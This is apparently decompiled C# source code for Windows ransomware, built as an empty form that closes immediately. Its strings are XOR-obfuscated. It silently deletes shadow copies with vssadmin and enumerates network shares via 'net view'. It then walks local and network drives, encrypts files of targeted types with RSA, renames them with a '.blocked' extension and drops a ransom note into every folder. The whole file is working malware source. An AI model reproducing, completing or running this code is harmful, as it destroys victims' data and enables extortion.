using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace ASCATT;

public class Form1 : Form
{
	private byte byte_0 = 99;

	private int int_0 = 245;

	private int int_1 = 3;

	private int int_2 = 5;

	private string string_0 = "";

	private string string_1;

	private string string_2 = "";

	private string string_3 = "";

	private string string_4 = "";

	private List<string> list_0 = new List<string>();

	private List<string> list_1 = new List<string>();

	private List<string> list_2 = new List<string>();

	private string string_5 = "";

	private string string_6 = "";

	private IContainer icontainer_0;

	public Form1()
	{
		InitializeComponent();
		method_0();
		if (!method_16())
		{
			if (Environment.OSVersion.Version.Major > 5)
			{
				method_17();
			}
			method_3();
			method_7();
			method_8();
		}
	}

	private void method_0()
	{
		method_1();
		for (int i = 0; i < 3; i++)
		{
		}
	}

	private void method_1()
	{
		method_2();
		for (int i = 0; i < 3; i++)
		{
		}
	}

	private void method_2()
	{
	}

	private void method_3()
	{
		byte[] byte_ = new byte[12]
		{
			8, 6, 26, 21, 2, 15, 22, 6, 77, 1,
			10, 13
		};
		byte[] byte_2 = new byte[7] { 1, 15, 12, 0, 8, 6, 7 };
		byte[] byte_3 = new byte[41]
		{
			66, 66, 66, 66, 66, 66, 66, 66, 169, 131,
			137, 67, 129, 141, 146, 146, 145, 131, 142, 141,
			129, 139, 145, 159, 67, 151, 131, 138, 136, 152,
			66, 66, 66, 66, 66, 66, 66, 77, 23, 27,
			23
		};
		byte[] byte_4 = new byte[75]
		{
			161, 131, 155, 139, 67, 151, 131, 138, 136, 152,
			67, 132, 131, 155, 139, 151, 147, 141, 129, 131,
			142, 152, 67, 146, 67, 139, 146, 140, 141, 136,
			159, 132, 141, 129, 131, 142, 139, 134, 143, 67,
			137, 147, 139, 140, 145, 141, 146, 145, 141, 138,
			137, 141, 128, 141, 67, 131, 136, 128, 141, 147,
			139, 145, 143, 131, 67, 49, 48, 34, 78, 81,
			83, 87, 91, 77, 67
		};
		byte[] byte_5 = new byte[112]
		{
			166, 146, 136, 139, 67, 150, 141, 145, 139, 145,
			134, 67, 139, 150, 67, 129, 134, 147, 142, 144,
			145, 159, 67, 141, 145, 140, 147, 131, 129, 159,
			145, 134, 67, 141, 135, 139, 142, 67, 139, 132,
			67, 132, 131, 155, 139, 151, 147, 141, 129, 131,
			142, 142, 152, 150, 67, 151, 131, 138, 136, 141,
			129, 67, 139, 67, 151, 131, 138, 136, 67, 8,
			6, 26, 21, 2, 15, 22, 6, 77, 1, 10,
			13, 67, 142, 131, 67, 6, 78, 14, 2, 10,
			15, 89, 67, 22, 13, 15, 12, 0, 8, 90,
			81, 35, 10, 13, 7, 10, 2, 77, 0, 12,
			14, 67
		};
		byte[] byte_6 = new byte[95]
		{
			166, 146, 136, 139, 67, 129, 152, 67, 142, 134,
			67, 140, 141, 136, 144, 148, 139, 136, 139, 67,
			141, 145, 129, 134, 145, 131, 67, 129, 67, 145,
			134, 148, 134, 142, 139, 134, 67, 146, 144, 145,
			141, 137, 67, 145, 141, 67, 146, 137, 131, 148,
			131, 138, 145, 134, 67, 146, 67, 146, 131, 138,
			145, 131, 67, 20, 20, 20, 77, 23, 12, 17,
			19, 17, 12, 9, 6, 0, 23, 77, 0, 12,
			13, 67, 130, 147, 131, 144, 132, 134, 147, 67,
			67, 55, 44, 49, 67
		};
		byte[] byte_7 = new byte[110]
		{
			139, 67, 146, 67, 134, 128, 141, 67, 140, 141,
			143, 141, 154, 159, 157, 67, 132, 131, 138, 135,
			139, 145, 134, 67, 142, 131, 67, 146, 131, 138,
			145, 89, 67, 11, 23, 23, 19, 89, 76, 76,
			6, 25, 22, 15, 27, 27, 23, 20, 18, 12,
			16, 86, 4, 84, 80, 85, 77, 12, 13, 10,
			12, 13, 67, 78, 67, 67, 145, 131, 143, 67,
			130, 144, 135, 134, 145, 67, 144, 137, 131, 132,
			131, 142, 67, 135, 134, 138, 146, 145, 129, 144,
			157, 154, 139, 138, 67, 140, 141, 148, 145, 141,
			129, 152, 138, 67, 156, 154, 139, 137, 77, 67
		};
		byte[] byte_8 = new byte[79]
		{
			172, 141, 140, 152, 145, 137, 139, 67, 146, 131,
			143, 141, 146, 145, 141, 156, 145, 134, 136, 159,
			142, 141, 128, 141, 67, 129, 141, 146, 146, 145,
			131, 142, 141, 129, 136, 134, 142, 139, 156, 67,
			151, 131, 138, 136, 141, 129, 67, 143, 141, 128,
			144, 145, 67, 130, 134, 132, 129, 141, 132, 129,
			147, 131, 145, 142, 141, 67, 139, 150, 67, 139,
			146, 140, 141, 147, 145, 139, 145, 159, 66
		};
		byte[] byte_9 = new byte[415]
		{
			95, 49, 48, 34, 40, 6, 26, 53, 2, 15,
			22, 6, 93, 95, 46, 12, 7, 22, 15, 22,
			16, 93, 72, 5, 37, 58, 10, 44, 90, 32,
			43, 90, 10, 57, 20, 20, 25, 15, 16, 50,
			80, 59, 72, 18, 57, 84, 54, 26, 27, 81,
			90, 83, 44, 11, 57, 82, 52, 21, 47, 23,
			85, 0, 14, 39, 7, 86, 12, 49, 16, 47,
			12, 43, 47, 13, 12, 36, 20, 16, 82, 32,
			52, 37, 46, 44, 36, 37, 9, 23, 1, 2,
			49, 44, 48, 8, 55, 4, 80, 52, 72, 84,
			81, 76, 55, 9, 25, 43, 8, 22, 51, 19,
			81, 52, 76, 49, 32, 84, 37, 33, 32, 87,
			41, 19, 4, 4, 22, 32, 10, 87, 27, 87,
			26, 6, 87, 43, 38, 20, 49, 8, 50, 84,
			86, 23, 43, 11, 10, 4, 83, 91, 11, 49,
			40, 14, 82, 2, 84, 20, 15, 20, 58, 15,
			91, 25, 47, 34, 25, 46, 91, 34, 20, 55,
			51, 47, 11, 84, 84, 83, 46, 44, 25, 51,
			18, 37, 82, 5, 41, 46, 40, 57, 32, 34,
			23, 7, 54, 4, 42, 40, 7, 58, 45, 34,
			8, 17, 51, 82, 91, 16, 49, 1, 16, 11,
			8, 36, 45, 9, 20, 9, 46, 11, 46, 47,
			45, 1, 40, 55, 2, 58, 5, 12, 80, 18,
			42, 48, 87, 21, 23, 53, 54, 50, 23, 0,
			20, 72, 4, 90, 26, 16, 80, 57, 37, 57,
			6, 23, 40, 38, 15, 83, 57, 46, 41, 38,
			19, 87, 59, 84, 1, 87, 43, 40, 90, 21,
			18, 54, 12, 11, 51, 33, 58, 5, 33, 16,
			25, 59, 58, 85, 10, 12, 13, 86, 14, 86,
			23, 48, 48, 5, 11, 41, 40, 85, 44, 59,
			81, 43, 51, 2, 54, 85, 49, 39, 0, 2,
			9, 55, 6, 38, 0, 14, 8, 90, 10, 23,
			90, 27, 84, 80, 7, 17, 41, 15, 6, 57,
			82, 36, 72, 23, 53, 4, 47, 85, 7, 22,
			47, 59, 76, 22, 44, 52, 51, 53, 26, 10,
			83, 17, 11, 26, 21, 58, 14, 49, 17, 36,
			45, 0, 42, 50, 94, 94, 95, 76, 46, 12,
			7, 22, 15, 22, 16, 93, 95, 38, 27, 19,
			12, 13, 6, 13, 23, 93, 34, 50, 34, 33,
			95, 76, 38, 27, 19, 12, 13, 6, 13, 23,
			93, 95, 76, 49, 48, 34, 40, 6, 26, 53,
			2, 15, 22, 6, 93
		};
		string_6 = method_18(byte_4, byte_0) + "\r\n" + method_18(byte_5, byte_0) + "\r\n" + method_18(byte_6, byte_0) + "\r\n" + method_18(byte_7, byte_0) + "\r\n" + method_18(byte_8, byte_0);
		string_3 = method_18(byte_9, byte_0);
		method_18(byte_3, byte_0);
		string_5 = method_18(byte_3, byte_0);
		string_2 = method_18(byte_, byte_0);
		string_1 = method_18(byte_2, byte_0);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System);
		folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf("\\system"));
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
		list_0.Add(folderPath.ToLower());
		list_0.Add(folderPath2.ToLower());
		list_0.Add("System Volume Information");
		list_0.Add("$RECYCLE.BIN");
		list_0.Add("RECYCLER");
		method_5();
		method_6();
		RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		string_0 = rSACryptoServiceProvider.ToXmlString(includePrivateParameters: false);
		string_4 = method_4(rSACryptoServiceProvider.ToXmlString(includePrivateParameters: true));
	}

	private string method_4(string string_7)
	{
		string text = "";
		byte[] array = new byte[string_7.Length];
		byte[] array2 = new byte[int_0];
		byte[] array3 = new byte[int_0 + 11];
		double num = Math.Ceiling((double)string_7.Length / (double)int_0);
		if ((double)string_7.Length < num * (double)int_0)
		{
			int length = string_7.Length;
			for (int i = 0; (double)i < num * (double)int_0 - (double)length; i++)
			{
				string_7 += " ";
			}
		}
		array = Encoding.Default.GetBytes(string_7);
		Array.Reverse((Array)array);
		try
		{
			RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
			rSACryptoServiceProvider.FromXmlString(string_3);
			for (int j = 0; (double)j < num; j++)
			{
				Array.Copy(array, j * int_0, array2, 0, int_0);
				array3 = rSACryptoServiceProvider.Encrypt(array2, fOAEP: false);
				text += Encoding.Default.GetString(array3);
			}
			return text;
		}
		catch
		{
			return text;
		}
	}

	private void method_5()
	{
		list_1.Add(method_18(new byte[3] { 77, 0, 7 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 15, 7, 5 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 14, 7, 5 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 14, 2, 27 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 7, 1, 5 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 6, 19, 5 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 82, 0, 7 }, byte_0));
		list_1.Add(method_18(new byte[3] { 77, 14, 7 }, byte_0));
		list_1.Add(method_18(new byte[3] { 77, 7, 1 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 19, 7, 5 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 19, 19, 23 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 27, 15, 16 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 7, 12, 0 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 2, 17, 9 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 23, 2, 17 }, byte_0));
		list_1.Add(method_18(new byte[3] { 77, 84, 25 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 17, 2, 17 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 25, 10, 19 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 23, 10, 5 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 9, 19, 4 }, byte_0));
		list_1.Add(method_18(new byte[3] { 77, 2, 10 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 1, 14, 19 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 19, 13, 4 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 0, 7, 17 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 19, 16, 7 }, byte_0));
		list_1.Add(method_18(new byte[5] { 77, 9, 19, 6, 4 }, byte_0));
		list_1.Add(method_18(new byte[5] { 77, 7, 12, 0, 27 }, byte_0));
		list_1.Add(method_18(new byte[5] { 77, 27, 15, 16, 27 }, byte_0));
		list_1.Add(method_18(new byte[5] { 77, 19, 19, 23, 27 }, byte_0));
		list_1.Add(method_18(new byte[6] { 77, 2, 0, 0, 7, 1 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 14, 7, 1 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 17, 23, 5 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 12, 7, 23 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 12, 7, 16 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 12, 7, 1 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 12, 7, 4 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 0, 17, 81 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 13, 6, 5 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 13, 17, 5 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 12, 17, 5 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 2, 17, 20 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 16, 17, 81 }, byte_0));
		list_1.Add(method_18(new byte[4] { 77, 16, 17, 5 }, byte_0));
	}

	private void method_6()
	{
		List<string> list = new List<string>();
		Process process = new Process();
		process.StartInfo.FileName = "cmd";
		process.StartInfo.Arguments = "/C net view";
		process.StartInfo.RedirectStandardOutput = true;
		process.StartInfo.UseShellExecute = false;
		process.StartInfo.CreateNoWindow = true;
		try
		{
			process.Start();
			string text = process.StandardOutput.ReadToEnd();
			int startIndex = 0;
			int num = 0;
			while (true)
			{
				startIndex = text.IndexOf('\\', startIndex);
				if (startIndex != -1)
				{
					num = text.IndexOf(' ', startIndex);
					list.Add(text.Substring(startIndex, num - startIndex));
					startIndex = num;
					continue;
				}
				break;
			}
		}
		catch
		{
		}
		for (int i = 0; i < list.Count; i++)
		{
			Process process2 = new Process();
			process2.StartInfo.FileName = "cmd";
			process2.StartInfo.Arguments = "/C net view " + list[i];
			process2.StartInfo.RedirectStandardOutput = true;
			process2.StartInfo.UseShellExecute = false;
			process2.StartInfo.CreateNoWindow = true;
			try
			{
				process2.Start();
				string s = process2.StandardOutput.ReadToEnd();
				byte[] bytes = Encoding.GetEncoding(1251).GetBytes(s);
				string[] array = Encoding.GetEncoding("CP866").GetString(bytes).Split('\r', '\n');
				for (int j = 0; j < array.Length; j++)
				{
					if (array[j].IndexOf("Диск") > -1)
					{
						list_2.Add(list[i] + "\\" + array[j].Substring(0, array[j].IndexOf("Диск")));
					}
				}
			}
			catch
			{
			}
		}
	}

	private void method_7()
	{
		try
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			for (int i = 0; i < logicalDrives.Length; i++)
			{
				DriveInfo driveInfo = new DriveInfo(logicalDrives[i]);
				if (driveInfo.DriveType == DriveType.Fixed || driveInfo.DriveType == DriveType.Network)
				{
					method_13(driveInfo.RootDirectory);
				}
			}
		}
		catch
		{
		}
	}

	private void method_8()
	{
		for (int i = 0; i < list_2.Count; i++)
		{
			DirectoryInfo directoryInfo_ = new DirectoryInfo(list_2[i].ToString());
			method_13(directoryInfo_);
		}
	}

	private void method_9(string string_7, string string_8)
	{
		try
		{
			File.WriteAllText(string_7, string_8);
		}
		catch
		{
		}
	}

	private void method_10(string string_7)
	{
		string currentDirectory = Environment.CurrentDirectory;
		if (string_7 != currentDirectory)
		{
			try
			{
				method_9(string_7 + "\\" + string_5, string_6);
			}
			catch
			{
			}
		}
	}

	private int method_11(string string_7)
	{
		int result = 0;
		try
		{
			result = Directory.GetFiles(string_7, "keyvalue*.bin").Length;
			return result;
		}
		catch
		{
			return result;
		}
	}

	private void method_12(string string_7, string string_8)
	{
		string text = string_2.Substring(0, string_2.Length - 4);
		if (!File.Exists(string_7 + "\\" + string_2))
		{
			try
			{
				method_9(string_7 + "\\" + string_2, string_8);
				return;
			}
			catch
			{
				return;
			}
		}
		try
		{
			method_9(string_7 + "\\" + text + method_11(string_7) + ".bin", string_8);
		}
		catch
		{
		}
	}

	private void method_13(DirectoryInfo directoryInfo_0)
	{
		try
		{
			DirectoryInfo[] directories = directoryInfo_0.GetDirectories();
			foreach (DirectoryInfo directoryInfo_ in directories)
			{
				method_14(directoryInfo_);
				method_13(directoryInfo_);
			}
		}
		catch
		{
		}
	}

	private void method_14(DirectoryInfo directoryInfo_0)
	{
		method_12(directoryInfo_0.FullName, string_4);
		method_10(directoryInfo_0.FullName);
		try
		{
			string[] files = Directory.GetFiles(directoryInfo_0.FullName, "*.*");
			foreach (string text in files)
			{
				foreach (string item in list_1)
				{
					if (text.ToLower().IndexOf(item) > -1 && text.ToLower().IndexOf(string_1.ToLower()) < 0)
					{
						string string_ = text;
						string string_2 = text + "." + string_1;
						method_15(string_, string_2);
					}
				}
			}
		}
		catch
		{
		}
	}

	private void method_15(string string_7, string string_8)
	{
		byte[] array = new byte[int_0];
		try
		{
			byte[] array2 = File.ReadAllBytes(string_7);
			if (array2.Length / (int_1 + 5) >= int_0)
			{
				RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
				rSACryptoServiceProvider.FromXmlString(string_0);
				byte[] array3 = new byte[array2.Length + int_1 * 11];
				byte[] array4 = new byte[array2.Length - int_1 * int_0];
				for (int i = 0; i < int_1; i++)
				{
					Array.Copy(array2, int_0 * i, array, 0, int_0);
					byte[] array5 = rSACryptoServiceProvider.Encrypt(array, fOAEP: false);
					Array.Copy(array5, 0, array3, i * (int_0 + 11), array5.Length);
				}
				Array.Copy(array2, int_1 * int_0, array4, 0, array4.Length);
				Array.Copy(array4, 0, array3, int_1 * (int_0 + 11), array4.Length);
				try
				{
					File.WriteAllBytes(string_7, array3);
					File.Move(string_7, string_8);
					return;
				}
				catch
				{
					return;
				}
			}
		}
		catch
		{
		}
	}

	private bool method_16()
	{
		bool result = false;
		if (Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName).Length > 1)
		{
			result = true;
		}
		return result;
	}

	private void method_17()
	{
		byte[] byte_ = new byte[12]
		{
			21, 16, 16, 2, 7, 14, 10, 13, 77, 6,
			27, 6
		};
		byte[] byte_2 = new byte[26]
		{
			39, 6, 15, 6, 23, 6, 67, 48, 11, 2,
			7, 12, 20, 16, 67, 76, 34, 15, 15, 67,
			76, 50, 22, 10, 6, 23
		};
		Process process = new Process();
		process.StartInfo.FileName = method_18(byte_, byte_0);
		process.StartInfo.Arguments = method_18(byte_2, byte_0);
		process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo.CreateNoWindow = true;
		try
		{
			process.Start();
		}
		catch
		{
		}
	}

	private string method_18(byte[] byte_1, int int_3)
	{
		byte[] array = new byte[byte_1.Length];
		for (int i = 0; i < byte_1.Length; i++)
		{
			array[i] = (byte)(byte_1[i] ^ byte_0);
		}
		return Encoding.Default.GetString(array);
	}

	private void method_19()
	{
		for (int i = 0; i < 2; i++)
		{
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		method_19();
		((Form)this).Close();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 261));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
